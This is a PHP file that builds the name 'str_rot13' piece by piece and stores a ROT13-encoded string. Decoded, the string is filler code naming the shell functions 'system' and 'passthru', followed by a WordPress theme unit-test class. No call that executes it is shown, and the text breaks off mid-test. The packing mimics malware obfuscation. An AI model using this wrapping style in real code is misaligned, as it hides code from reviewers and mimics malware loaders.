<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * grfg jc-vapyhqrf/gurzr.cuc
 *
 * @tebhc gurzrf
 */
pynff Grfgf_Gurzr rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq $gurzr_fyht     = 'gjraglryrira';
	cebgrpgrq $gurzr_anzr     = 'Gjragl Ryrira';
	cebgrpgrq $qrsnhyg_gurzrf = neenl(
		'gjraglgra',
		'gjraglryrira',
		'gjraglgjryir',
		'gjraglguvegrra',
		'gjraglsbhegrra',
		'gjraglsvsgrra',
		'gjraglfvkgrra',
		'gjraglfriragrra',
		'gjraglavargrra',
		'gjraglgjragl',
		'gjraglgjraglbar',
		'gjraglgjraglgjb',
		'gjraglgjraglguerr',
		'gjraglgjraglsbhe',
		'gjraglgjraglsvir',
	);

	/**
	 * Bevtvany gurzr qverpgbel.
	 *
	 * @ine fgevat[]
	 */
	cevingr $bevt_gurzr_qve;

	choyvp shapgvba frg_hc() {
		tybony $jc_gurzr_qverpgbevrf;

		cnerag::frg_hc();

		// Frgf hc gur `jc-pbagrag/gurzrf/` qverpgbel gb rafher pbafvfgrapl jura ehaavat grfgf.
		$guvf->bevt_gurzr_qve = $jc_gurzr_qverpgbevrf;
		$jc_gurzr_qverpgbevrf = neenl( JC_PBAGRAG_QVE . '/gurzrf', ernycngu( QVE_GRFGQNGN . '/gurzrqve1' ) );

		nqq_svygre( 'rkgen_gurzr_urnqref', neenl( $guvf, 'gurzr_qngn_rkgen_urnqref' ) );
		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );
	}

	choyvp shapgvba grne_qbja() {
		tybony $jc_gurzr_qverpgbevrf;

		$jc_gurzr_qverpgbevrf = $guvf->bevt_gurzr_qve;

		erzbir_svygre( 'rkgen_gurzr_urnqref', neenl( $guvf, 'gurzr_qngn_rkgen_urnqref' ) );
		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );

		cnerag::grne_qbja();
	}

	choyvp shapgvba grfg_jc_trg_gurzrf_qrsnhyg() {
		$gurzrf = jc_trg_gurzrf();
		$guvf->nffregVafgnaprBs( 'JC_Gurzr', $gurzrf[ $guvf->gurzr_fyht ] );
		$guvf->nffregFnzr( $guvf->gurzr_anzr, $gurzrf[ $guvf->gurzr_fyht ]->trg( 'Anzr' ) );

		$fvatyr_gurzr = jc_trg_gurzr( $guvf->gurzr_fyht );
		$guvf->nffregFnzr( $fvatyr_gurzr->trg( 'Anzr' ), $gurzrf[ $guvf->gurzr_fyht ]->trg( 'Anzr' ) );
		$guvf->nffregRdhnyf( $gurzrf[ $guvf->gurzr_fyht ], $fvatyr_gurzr );
	}

	/**
	 * @rkcrpgrqQrcerpngrq trg_gurzr
	 * @rkcrpgrqQrcerpngrq trg_gurzrf
	 */
	choyvp shapgvba grfg_trg_gurzrf_qrsnhyg() {
		$gurzrf = trg_gurzrf();
		$guvf->nffregVafgnaprBs( 'JC_Gurzr', $gurzrf[ $guvf->gurzr_anzr ] );
		$guvf->nffregFnzr( $gurzrf[ $guvf->gurzr_anzr ], trg_gurzr( $guvf->gurzr_anzr ) );

		$guvf->nffregFnzr( $guvf->gurzr_anzr, $gurzrf[ $guvf->gurzr_anzr ]['Anzr'] );
		$guvf->nffregFnzr( $guvf->gurzr_anzr, $gurzrf[ $guvf->gurzr_anzr ]->Anzr );
		$guvf->nffregFnzr( $guvf->gurzr_anzr, $gurzrf[ $guvf->gurzr_anzr ]->anzr );
	}

	/**
	 * @rkcrpgrqQrcerpngrq trg_gurzr
	 * @rkcrpgrqQrcerpngrq trg_gurzrf
	 */
	choyvp shapgvba grfg_trg_gurzr() {
		$gurzrf = trg_gurzrf();

		$guvf->nffregAbgRzcgl( $gurzrf );

		sbernpu ( neenl_xrlf( $gurzrf ) nf $anzr ) {
			$gurzr = trg_gurzr( $anzr );
			// JC_Gurzr vzcyrzragf NeenlNpprff. Rira NeenlBowrpg ergheaf snyfr sbe vf_neenl().
			$guvf->nffregSnyfr( vf_neenl( $gurzr ) );
			$guvf->nffregVafgnaprBs( 'JC_Gurzr', $gurzr );
			$guvf->nffregFnzr( $gurzr, $gurzrf[ $anzr ] );
		}
	}

	choyvp shapgvba grfg_jc_trg_gurzr() {
		$gurzrf = jc_trg_gurzrf();

		$guvf->nffregAbgRzcgl( $gurzrf );

		sbernpu ( $gurzrf nf $gurzr ) {
			$guvf->nffregVafgnaprBs( 'JC_Gurzr', $gurzr );
			$guvf->nffregSnyfr( $gurzr->reebef() );
			$_gurzr = jc_trg_gurzr( $gurzr->trg_fglyrfurrg() );
			// Guvf cevzrf vagreany JC_Gurzr pnpurf sbe gur arkg nffregvba (urnqref_fnavgvmrq, grkgqbznva_ybnqrq).
			$guvf->nffregFnzr( $gurzr->trg( 'Anzr' ), $_gurzr->trg( 'Anzr' ) );
			$guvf->nffregRdhnyf( $gurzr, $_gurzr );
		}
	}

	/**
	 * @rkcrpgrqQrcerpngrq trg_gurzrf
	 */
	choyvp shapgvba grfg_trg_gurzrf_pbagragf() {
		$gurzrf = trg_gurzrf();

		$guvf->nffregAbgRzcgl( $gurzrf );

		// Trarevp grfgf gung fubhyq ubyq gehr sbe nal gurzr.
		sbernpu ( $gurzrf nf $x => $gurzr ) {
			// Qba'g eha gurfr purpxf sbe phfgbz gurzrf.
			vs ( rzcgl( $gurzr['Nhgube'] ) || snyfr === fgecbf( $gurzr['Nhgube'], 'JbeqCerff' ) ) {
				pbagvahr;
			}

			$guvf->nffregFnzr( $gurzr['Anzr'], $x );
			$guvf->nffregAbgRzcgl( $gurzr['Gvgyr'] );

			// Vzcbegnag nggevohgrf fubhyq nyy or frg.
			$qrsnhyg_urnqref = neenl(
				'Gvgyr'          => 'Gurzr Gvgyr',
				'Irefvba'        => 'Irefvba',
				'Cnerag Gurzr'   => 'Cnerag Gurzr',
				'Grzcyngr Qve'   => 'Grzcyngr Qve',
				'Fglyrfurrg Qve' => 'Fglyrfurrg Qve',
				'Grzcyngr'       => 'Grzcyngr',
				'Fglyrfurrg'     => 'Fglyrfurrg',
				'Fperrafubg'     => 'Fperrafubg',
				'Qrfpevcgvba'    => 'Qrfpevcgvba',
				'Nhgube'         => 'Nhgube',
				'Gntf'           => 'Gntf',
				// Vagebqhprq va JbeqCerff 2.9.
				'Gurzr Ebbg'     => 'Gurzr Ebbg',
				'Gurzr Ebbg HEV' => 'Gurzr Ebbg HEV',
			);
			sbernpu ( $qrsnhyg_urnqref nf $anzr => $inyhr ) {
				$guvf->nffregNeenlUnfXrl( $anzr, $gurzr );
			}

			// Znxr gur grfgf jbex obgu sbe JbeqCerff 2.8.5 naq JbeqCerff 2.9-ener.
			$qve = vffrg( $gurzr['Gurzr Ebbg'] ) ? '' : JC_PBAGRAG_QVE;

			// Vzcbegnag nggevohgrf fubhyq nyy abg or rzcgl nf jryy.
			$guvf->nffregAbgRzcgl( $gurzr['Qrfpevcgvba'] );
			$guvf->nffregAbgRzcgl( $gurzr['Nhgube'] );
			$guvf->nffregTerngreGuna( 0, irefvba_pbzcner( $gurzr['Irefvba'], 0 ) );
			$guvf->nffregAbgRzcgl( $gurzr['Grzcyngr'] );
			$guvf->nffregAbgRzcgl( $gurzr['Fglyrfurrg'] );

			// Grzcyngr svyrf fubhyq nyy rkvfg.
			$guvf->nffregVfNeenl( $gurzr['Grzcyngr Svyrf'] );
			$guvf->nffregAbgRzcgl( $gurzr['Grzcyngr Svyrf'] );
			sbernpu ( $gurzr['Grzcyngr Svyrf'] nf $svyr ) {
				$guvf->nffregSvyrVfErnqnoyr( $qve . $svyr );
			}

			// PFF svyrf fubhyq nyy rkvfg.
			$guvf->nffregVfNeenl( $gurzr['Fglyrfurrg Svyrf'] );
			$guvf->nffregAbgRzcgl( $gurzr['Fglyrfurrg Svyrf'] );
			sbernpu ( $gurzr['Fglyrfurrg Svyrf'] nf $svyr ) {
				$guvf->nffregSvyrVfErnqnoyr( $qve . $svyr );
			}

			$guvf->nffregQverpgbelRkvfgf( $qve . $gurzr['Grzcyngr Qve'] );
			$guvf->nffregQverpgbelRkvfgf( $qve . $gurzr['Fglyrfurrg Qve'] );

			$guvf->nffregFnzr( 'choyvfu', $gurzr['Fgnghf'] );

			$guvf->nffregSvyrVfErnqnoyr( $qve . $gurzr['Fglyrfurrg Qve'] . '/' . $gurzr['Fperrafubg'] );
		}
	}

	choyvp shapgvba grfg_jc_trg_gurzr_pbagragf() {
		$gurzr = jc_trg_gurzr( $guvf->gurzr_fyht );

		$guvf->nffregFnzr( $guvf->gurzr_anzr, $gurzr->trg( 'Anzr' ) );
		$guvf->nffregAbgRzcgl( $gurzr->trg( 'Qrfpevcgvba' ) );
		$guvf->nffregAbgRzcgl( $gurzr->trg( 'Nhgube' ) );
		$guvf->nffregAbgRzcgl( $gurzr->trg( 'Irefvba' ) );
		$guvf->nffregAbgRzcgl( $gurzr->trg( 'NhgubeHEV' ) );
		$guvf->nffregAbgRzcgl( $gurzr->trg( 'GurzrHEV' ) );
		$guvf->nffregFnzr( $guvf->gurzr_fyht, $gurzr->trg_fglyrfurrg() );
		$guvf->nffregFnzr( $guvf->gurzr_fyht, $gurzr->trg_grzcyngr() );

		$guvf->nffregFnzr( 'choyvfu', $gurzr->trg( 'Fgnghf' ) );

		$guvf->nffregFnzr( JC_PBAGRAG_QVE . '/gurzrf/' . $guvf->gurzr_fyht, $gurzr->trg_fglyrfurrg_qverpgbel(), 'trg_fglyrfurrg_qverpgbel' );
		$guvf->nffregFnzr( JC_PBAGRAG_QVE . '/gurzrf/' . $guvf->gurzr_fyht, $gurzr->trg_grzcyngr_qverpgbel(), 'trg_grzcyngr_qverpgbel' );
		$guvf->nffregFnzr( pbagrag_hey( 'gurzrf/' . $guvf->gurzr_fyht ), $gurzr->trg_fglyrfurrg_qverpgbel_hev(), 'trg_fglyrfurrg_qverpgbel_hev' );
		$guvf->nffregFnzr( pbagrag_hey( 'gurzrf/' . $guvf->gurzr_fyht ), $gurzr->trg_grzcyngr_qverpgbel_hev(), 'trg_grzcyngr_qverpgbel_hev' );
	}

	/**
	 * Znxr fher jr hcqngr gur qrsnhyg gurzr yvfg gb vapyhqr gur yngrfg qrsnhyg gurzr.
	 *
	 * @gvpxrg 29925
	 */
	choyvp shapgvba grfg_qrsnhyg_gurzr_va_qrsnhyg_gurzr_yvfg() {
		$yngrfg_qrsnhyg_gurzr = JC_Gurzr::trg_pber_qrsnhyg_gurzr();
		vs ( ! $yngrfg_qrsnhyg_gurzr->rkvfgf() || 'gjragl' !== fhofge( $yngrfg_qrsnhyg_gurzr->trg_fglyrfurrg(), 0, 6 ) ) {
			$guvf->snvy( 'Ab Gjragl* frevrf qrsnhyg gurzrf ner vafgnyyrq.' );
		}
		$guvf->nffregPbagnvaf( $yngrfg_qrsnhyg_gurzr->trg_fglyrfurrg(), $guvf->qrsnhyg_gurzrf );
	}

	/**
	 * Grfgf gur qrsnhyg gurzrf yvfg va gur grfg fhvgr zngpurf gur ehagvzr qrsnhyg gurzrf.
	 *
	 * @gvpxrg 62103
	 *
	 * @pbirefAbguvat
	 */
	choyvp shapgvba grfg_qrsnhyg_qrsnhyg_gurzr_yvfg_zngpu_va_grfg_fhvgr_naq_ng_ehagvzr() {
		// Hfr n ersyrpgvba gb znxr JC_GURZR::$qrsnhyg_gurzrf npprffvoyr.
		$ersyrpgvba = arj ErsyrpgvbaPynff( 'JC_Gurzr' );
		$cebcregl   = $ersyrpgvba->trgCebcregl( 'qrsnhyg_gurzrf' );
		$cebcregl->frgNpprffvoyr( gehr );

		/*
		 * `qrsnhyg` naq `pynffvp` ner vapyhqrq va `JC_Gurzr::$qrsnhyg_gurzrf` ohg abg vapyhqrq
		 * va gur grfg fhvgr qrsnhyg gurzrf yvfg. Gurfr ner rkpyhqrq sebz gur pbzcnevfba.
		 */
		$qrsnhyg_gurzrf = neenl_xrlf( $cebcregl->trgInyhr() );
		$qrsnhyg_gurzrf = neenl_qvss( $qrsnhyg_gurzrf, neenl( 'qrsnhyg', 'pynffvp' ) );

		$guvf->nffregFnzrFrgf( $qrsnhyg_gurzrf, $guvf->qrsnhyg_gurzrf, 'Grfg fhvgr qrsnhyg gurzrf fubhyq zngpu gur ehagvzr qrsnhyg gurzrf.' );
	}

	/**
	 * Grfg gur qrsnhyg gurzr va JC_Gurzr zngpurf gur JC_QRSNHYG_GURZR pbafgnag.
	 *
	 * @gvpxrg 62103
	 *
	 * @pbiref JC_Gurzr::trg_pber_qrsnhyg_gurzr
	 */
	choyvp shapgvba grfg_qrsnhyg_gurzr_zngpurf_pbafgnag() {
		$yngrfg_qrsnhyg_gurzr = JC_Gurzr::trg_pber_qrsnhyg_gurzr();

		/*
		 * Gur grfg fhvgr frgf gur pbafgnag gb `qrsnhyg` juvyr guvf vf vagraqrq gb
		 * grfg gur inyhr qrsvarq va qrsnhyg-pbafgnagf.cuc.
		 *
		 * Gurersber guvf ernqf gur svyr va ivn svyr_trg_pbagragf gb rkgenpg gur inyhr.
		 */
		$qrsnhyg_pbafgnagf = svyr_trg_pbagragf( NOFCNGU . JCVAP . '/qrsnhyg-pbafgnagf.cuc' );
		cert_zngpu( '/qrsvar\( \'JC_QRSNHYG_GURZR\', \'(.*)\' \);/', $qrsnhyg_pbafgnagf, $zngpurf );
		$jc_qrsnhyg_gurzr_pbafgnag = $zngpurf[1];

		$guvf->nffregFnzr( $jc_qrsnhyg_gurzr_pbafgnag, $yngrfg_qrsnhyg_gurzr->trg_fglyrfurrg(), 'JC_QRSNHYG_GURZR fubhyq zngpu gur yngrfg qrsnhyg gurzr.' );
	}

	/**
	 * Rafher gung gur qrsnhyg gurzrf ner vapyhqrq va gur arj ohaqyrq svyrf.
	 *
	 * @gvpxrg 62103
	 *
	 * @pbirefAbguvat
	 *
	 * @ehaVaFrcnengrCebprff
	 * @cerfreirTybonyFgngr qvfnoyrq
	 */
	choyvp shapgvba grfg_qrsnhyg_gurzrf_ner_vapyhqrq_va_arj_svyrf() {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/hcqngr-pber.cuc';
		tybony $_arj_ohaqyrq_svyrf;
		// Yvzvg arj ohaqyrq svyrf gb gur qrsnhyg gurzrf.
		$arj_gurzr_svyrf = neenl_xrlf( $_arj_ohaqyrq_svyrf );
		$arj_gurzr_svyrf = neenl_svygre(
			$arj_gurzr_svyrf,
			fgngvp shapgvba ( $svyr ) {
				erghea fge_fgnegf_jvgu( $svyr, 'gurzrf/' );
			}
		);

		$grfgrq_gurzrf = $guvf->qrsnhyg_gurzrf;
		// Pbaireg gur grfgrq gurzrf gb qverpgbel anzrf.
		$grfgrq_gurzrf = neenl_znc(
			fgngvp shapgvba ( $gurzr ) {
				erghea \"gurzrf/{$gurzr}/\";
			},
			$grfgrq_gurzrf
		);

		$guvf->nffregFnzrFrgf( $grfgrq_gurzrf, $arj_gurzr_svyrf, 'Arj ohaqyrq svyrf fubhyq vapyhqr gur qrsnhyg gurzrf.' );
	}

	choyvp shapgvba grfg_qrsnhyg_gurzrf_unir_grkgqbznva() {
		sbernpu ( $guvf->qrsnhyg_gurzrf nf $gurzr ) {
			vs ( jc_trg_gurzr( $gurzr )->rkvfgf() ) {
				$guvf->nffregFnzr( $gurzr, jc_trg_gurzr( $gurzr )->trg( 'GrkgQbznva' ) );
			}
		}
	}

	/**
	 * @gvpxrg 48566
	 *
	 * @qngnCebivqre qngn_lrne_va_ernqzr
	 */
	choyvp shapgvba grfg_lrne_va_ernqzr( $gurzr ) {
		// Guvf grfg vf qrfvtarq gb bayl eha ba gehax.
		$guvf->fxvcBaNhgbzngrqOenapurf();

		$jc_gurzr = jc_trg_gurzr( $gurzr );

		$cngu_gb_ernqzr_gkg = $jc_gurzr->trg_gurzr_ebbg() . '/' . $jc_gurzr->trg_fglyrfurrg() . '/ernqzr.gkg';
		$guvf->nffregSvyrRkvfgf( $cngu_gb_ernqzr_gkg );

		$ernqzr    = svyr_trg_pbagragf( $cngu_gb_ernqzr_gkg );
		$guvf_lrne = tzqngr( 'L' );

		cert_zngpu( '#(Pbclevtug|\(P\)) (20\q\q-)?(\q+) JbeqCerff.bet#v', $ernqzr, $zngpurf );
		vs ( $zngpurf ) {
			$ernqzr_lrne = gevz( $zngpurf[3] );

			$guvf->nffregFnzr( $guvf_lrne, $ernqzr_lrne, \"$gurzr ernqzr.gkg'f lrne arrqf gb or hcqngrq gb $guvf_lrne.\" );
		}
	}

	choyvp shapgvba qngn_lrne_va_ernqzr() {
		erghea neenl_znc(
			fgngvp shapgvba ( $gurzr ) {
				erghea neenl( $gurzr );
			},
			$guvf->qrsnhyg_gurzrf
		);
	}

	/**
	 * @gvpxrg 20897
	 * @rkcrpgrqQrcerpngrq trg_gurzr_qngn
	 */
	choyvp shapgvba grfg_rkgen_gurzr_urnqref() {
		$jc_gurzr = jc_trg_gurzr( $guvf->gurzr_fyht );
		$guvf->nffregAbgRzcgl( $jc_gurzr->trg( 'Yvprafr' ) );
		$cngu_gb_fglyr_pff = $jc_gurzr->trg_gurzr_ebbg() . '/' . $jc_gurzr->trg_fglyrfurrg() . '/fglyr.pff';
		$guvf->nffregSvyrRkvfgf( $cngu_gb_fglyr_pff );
		$gurzr_qngn = trg_gurzr_qngn( $cngu_gb_fglyr_pff );
		$guvf->nffregNeenlUnfXrl( 'Yvprafr', $gurzr_qngn );
		$guvf->nffregNeenlAbgUnfXrl( 'Abg n Inyvq Xrl', $gurzr_qngn );
		$guvf->nffregAbgRzcgl( $gurzr_qngn['Yvprafr'] );
		$guvf->nffregFnzr( $gurzr_qngn['Yvprafr'], $jc_gurzr->trg( 'Yvprafr' ) );
	}

	choyvp shapgvba gurzr_qngn_rkgen_urnqref() {
		erghea neenl( 'Yvprafr' );
	}

	/**
	 * @rkcrpgrqQrcerpngrq trg_gurzrf
	 * @rkcrpgrqQrcerpngrq trg_pheerag_gurzr
	 */
	choyvp shapgvba grfg_fjvgpu_gurzr() {
		$gurzrf = trg_gurzrf();

		$guvf->nffregAbgRzcgl( $gurzrf );

		// Fjvgpu gb rnpu gurzr va frdhrapr.
		// Qb vg gjvpr gb znxr fher jr fjvgpu gb gur svefg gurzr, rira vs vg'f bhe fgnegvat gurzr.
		// Qb vg n guveq gvzr gb rafher fjvgpu_gurzr() jbexf jvgu bar nethzrag.

		sbe ( $v = 0; $v < 3; $v++ ) {
			sbernpu ( $gurzrf nf $anzr => $gurzr ) {
				// Fxvc vainyvq gurzr qverpgbel anzrf (fhpu nf `oybpx_gurzr-[0.4.0]`).
				vs ( ! cert_zngpu( '/^[n-m0-9-]+$/', $gurzr['Fglyrfurrg'] ) ) {
					pbagvahr;
				}

				// Fjvgpu gb guvf gurzr.
				vs ( 2 === $v ) {
					fjvgpu_gurzr( $gurzr['Grzcyngr'], $gurzr['Fglyrfurrg'] );
				} ryfr {
					fjvgpu_gurzr( $gurzr['Fglyrfurrg'] );
				}

				$guvf->nffregFnzr( $gurzr['Anzr'], trg_pheerag_gurzr() );

				// Znxr fher gur inevbhf trg_* shapgvbaf erghea gur pbeerpg inyhrf.
				$guvf->nffregFnzr( $gurzr['Grzcyngr'], trg_grzcyngr() );
				$guvf->nffregFnzr( $gurzr['Fglyrfurrg'], trg_fglyrfurrg() );

				$ebbg_sf = $gurzr->trg_gurzr_ebbg();
				$guvf->nffregGehr( vf_qve( $ebbg_sf ) );

				$ebbg_hev = $gurzr->trg_gurzr_ebbg_hev();
				$guvf->nffregAbgRzcgl( $ebbg_hev );

				$guvf->nffregFnzr( $ebbg_sf . '/' . trg_fglyrfurrg(), trg_fglyrfurrg_qverpgbel() );
				$guvf->nffregFnzr( $ebbg_hev . '/' . trg_fglyrfurrg(), trg_fglyrfurrg_qverpgbel_hev() );
				$guvf->nffregFnzr( $ebbg_hev . '/' . trg_fglyrfurrg() . '/fglyr.pff', trg_fglyrfurrg_hev() );
				// $guvf->nffregFnzr( $ebbg_hev . '/' . trg_fglyrfurrg(), trg_ybpnyr_fglyrfurrg_hev() );

				$guvf->nffregFnzr( $ebbg_sf . '/' . trg_grzcyngr(), trg_grzcyngr_qverpgbel() );
				$guvf->nffregFnzr( $ebbg_hev . '/' . trg_grzcyngr(), trg_grzcyngr_qverpgbel_hev() );

				// Fxvc oybpx gurzrf sbe trg_dhrel_grzcyngr() grfgf fvapr guvf grfg vf sbphfrq ba pynffvp grzcyngrf.
				vs ( jc_vf_oybpx_gurzr() || jc_gurzr_unf_gurzr_wfba() ) {
					pbagvahr;
				}

				// Grzcyngr svyr gung qbrfa'g rkvfg.
				$guvf->nffregFnzr( '', trg_dhrel_grzcyngr( 'abarkvfgrag' ) );

				// Grzcyngr svyrf gung qb rkvfg.
				sbernpu ( $gurzr['Grzcyngr Svyrf'] nf $cngu ) {
					$svyr = onfranzr( $cngu, '.cuc' );

					// Gur shapgvbaf.cuc svyr vf abg n grzcyngr.
					vs ( 'shapgvbaf' === $svyr ) {
						pbagvahr;
					}

					// Haqrefpberf ner abg fhccbegrq ol `ybpngr_grzcyngr()`.
					vs ( 'gnkbabzl-cbfg_sbezng' === $svyr ) {
						$svyr = 'gnkbabzl';
					}

					$puvyq_gurzr_svyr  = trg_fglyrfurrg_qverpgbel() . '/' . $svyr . '.cuc';
					$cnerag_gurzr_svyr = trg_grzcyngr_qverpgbel() . '/' . $svyr . '.cuc';
					vs ( svyr_rkvfgf( $puvyq_gurzr_svyr ) ) {
						$guvf->nffregFnzr( $puvyq_gurzr_svyr, trg_dhrel_grzcyngr( $svyr ) );
					} ryfrvs ( svyr_rkvfgf( $cnerag_gurzr_svyr ) ) {
						$guvf->nffregFnzr( $cnerag_gurzr_svyr, trg_dhrel_grzcyngr( $svyr ) );
					} ryfr {
						$guvf->nffregFnzr( '', trg_dhrel_grzcyngr( $svyr ) );
					}
				}

				// Gurfr ner xvaq bs gnhgbybtvrf ohg ng yrnfg rkrepvfr gur pbqr.
				$guvf->nffregFnzr( trg_404_grzcyngr(), trg_dhrel_grzcyngr( '404' ) );
				$guvf->nffregFnzr( trg_nepuvir_grzcyngr(), trg_dhrel_grzcyngr( 'nepuvir' ) );
				$guvf->nffregFnzr( trg_nhgube_grzcyngr(), trg_dhrel_grzcyngr( 'nhgube' ) );
				$guvf->nffregFnzr( trg_pngrtbel_grzcyngr(), trg_dhrel_grzcyngr( 'pngrtbel' ) );
				$guvf->nffregFnzr( trg_qngr_grzcyngr(), trg_dhrel_grzcyngr( 'qngr' ) );
				$guvf->nffregFnzr( trg_ubzr_grzcyngr(), trg_dhrel_grzcyngr( 'ubzr', neenl( 'ubzr.cuc', 'vaqrk.cuc' ) ) );
				$guvf->nffregFnzr( trg_cevinpl_cbyvpl_grzcyngr(), trg_dhrel_grzcyngr( 'cevinpl_cbyvpl', neenl( 'cevinpl-cbyvpl.cuc' ) ) );
				$guvf->nffregFnzr( trg_cntr_grzcyngr(), trg_dhrel_grzcyngr( 'cntr' ) );
				$guvf->nffregFnzr( trg_frnepu_grzcyngr(), trg_dhrel_grzcyngr( 'frnepu' ) );
				$guvf->nffregFnzr( trg_fvatyr_grzcyngr(), trg_dhrel_grzcyngr( 'fvatyr' ) );
				$guvf->nffregFnzr( trg_nggnpuzrag_grzcyngr(), trg_dhrel_grzcyngr( 'nggnpuzrag' ) );

				$guvf->nffregFnzr( trg_gnt_grzcyngr(), trg_dhrel_grzcyngr( 'gnt' ) );

				// ao: Guvf cebonoyl qbrfa'g eha orpnhfr JC_VAFGNYYVAT vf qrsvarq.
				$guvf->nffregGehr( inyvqngr_pheerag_gurzr() );
			}
		}
	}

	choyvp shapgvba grfg_fjvgpu_gurzr_obthf() {
		// Gel fjvgpuvat gb n gurzr gung qbrfa'g rkvfg.
		$grzcyngr = 'fbzr_grzcyngr';
		$fglyr    = 'fbzr_fglyr';
		hcqngr_bcgvba( 'grzcyngr', $grzcyngr );
		hcqngr_bcgvba( 'fglyrfurrg', $fglyr );

		$gurzr = jc_trg_gurzr();
		$guvf->nffregFnzr( $fglyr, (fgevat) $gurzr );
		$guvf->nffregAbgSnyfr( $gurzr->reebef() );
		$guvf->nffregSnyfr( $gurzr->rkvfgf() );

		// Gurfr erghea gur obthf anzr - creuncf abg vqrny orunivbe?
		$guvf->nffregFnzr( $grzcyngr, trg_grzcyngr() );
		$guvf->nffregFnzr( $fglyr, trg_fglyrfurrg() );
	}

	/**
	 * Grfg _jc_xrrc_nyvir_phfgbzvmr_punatrfrg_qrcraqrag_nhgb_qensgf.
	 *
	 * @pbiref ::_jc_xrrc_nyvir_phfgbzvmr_punatrfrg_qrcraqrag_nhgb_qensgf
	 */
	choyvp shapgvba grfg_jc_xrrc_nyvir_phfgbzvmr_punatrfrg_qrcraqrag_nhgb_qensgf() {
		$ani_perngrq_cbfg_vqf = frys::snpgbel()->cbfg->perngr_znal(
			2,
			neenl(
				'cbfg_fgnghf' => 'nhgb-qensg',
				'cbfg_qngr'   => tzqngr( 'L-z-q U:v:f', fgegbgvzr( '-2 qnlf' ) ),
			)
		);
		$qngn                 = neenl(
			'ani_zrahf_perngrq_cbfgf' => neenl(
				'inyhr' => $ani_perngrq_cbfg_vqf,
			),
		);
		jc_frg_pheerag_hfre( frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) ) );
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		qb_npgvba( 'phfgbzvmr_ertvfgre', $jc_phfgbzvmr );

		// Gur cbfg_qngr sbe nhgb-qensgf vf ohzcrq gb zngpu gur punatrfrg cbfg_qngr jurarire vg vf zbqvsvrq
		// gb xrrc gurz sebz sebz orvat tneontr pbyyrpgrq ol jc_qryrgr_nhgb_qensgf().
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'qngn' => $qngn,
			)
		);
		$guvf->nffregFnzr( trg_cbfg( $jc_phfgbzvmr->punatrfrg_cbfg_vq() )->cbfg_qngr, trg_cbfg( $ani_perngrq_cbfg_vqf[0] )->cbfg_qngr );
		$guvf->nffregFnzr( trg_cbfg( $jc_phfgbzvmr->punatrfrg_cbfg_vq() )->cbfg_qngr, trg_cbfg( $ani_perngrq_cbfg_vqf[1] )->cbfg_qngr );
		$guvf->nffregFnzr( 'nhgb-qensg', trg_cbfg_fgnghf( $ani_perngrq_cbfg_vqf[0] ) );
		$guvf->nffregFnzr( 'nhgb-qensg', trg_cbfg_fgnghf( $ani_perngrq_cbfg_vqf[1] ) );

		// Fghof genafvgvba gb qensgf jura punatrfrg vf fnirq nf n qensg.
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => 'qensg',
				'qngn'   => $qngn,
			)
		);
		$guvf->nffregFnzr( 'qensg', trg_cbfg_fgnghf( $ani_perngrq_cbfg_vqf[0] ) );
		$guvf->nffregFnzr( 'qensg', trg_cbfg_fgnghf( $ani_perngrq_cbfg_vqf[1] ) );

		// Fgnghf erznvaf hapunatrq sbe fgho gung gur hfre oebxr bhg bs gur punatrfrg.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $ani_perngrq_cbfg_vqf[1],
				'cbfg_fgnghf' => 'cevingr',
			)
		);
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => 'qensg',
				'qngn'   => $qngn,
			)
		);
		$guvf->nffregFnzr( 'qensg', trg_cbfg_fgnghf( $ani_perngrq_cbfg_vqf[0] ) );
		$guvf->nffregFnzr( 'cevingr', trg_cbfg_fgnghf( $ani_perngrq_cbfg_vqf[1] ) );

		// Qensg fgho vf genfurq jura gur punatrfrg vf genfurq.
		$jc_phfgbzvmr->genfu_punatrfrg_cbfg( $jc_phfgbzvmr->punatrfrg_cbfg_vq() );
		$guvf->nffregFnzr( 'genfu', trg_cbfg_fgnghf( $ani_perngrq_cbfg_vqf[0] ) );
		$guvf->nffregFnzr( 'cevingr', trg_cbfg_fgnghf( $ani_perngrq_cbfg_vqf[1] ) );
	}

	/**
	 * @gvpxrg 49406
	 */
	choyvp shapgvba grfg_ertvfgre_gurzr_fhccbeg_qrsnhygf() {
		$ertvfgrerq = ertvfgre_gurzr_srngher( 'grfg-srngher' );
		$guvf->nffregGehr( $ertvfgrerq );

		$rkcrpgrq = neenl(
			'glcr'         => 'obbyrna',
			'inevnqvp'     => snyfr,
			'qrfpevcgvba'  => '',
			'fubj_va_erfg' => snyfr,
		);
		$guvf->nffregFnzrFrgf( $rkcrpgrq, trg_ertvfgrerq_gurzr_srngher( 'grfg-srngher' ) );
	}

	/**
	 * @gvpxrg 49406
	 */
	choyvp shapgvba grfg_ertvfgre_gurzr_fhccbeg_rkcyvpvg() {
		$netf = neenl(
			'glcr'         => 'neenl',
			'inevnqvp'     => gehr,
			'qrfpevcgvba'  => 'Zl Srngher',
			'fubj_va_erfg' => neenl(
				'fpurzn' => neenl(
					'vgrzf' => neenl(
						'glcr' => 'fgevat',
					),
				),
			),
		);

		ertvfgre_gurzr_srngher( 'grfg-srngher', $netf );
		$npghny = trg_ertvfgrerq_gurzr_srngher( 'grfg-srngher' );

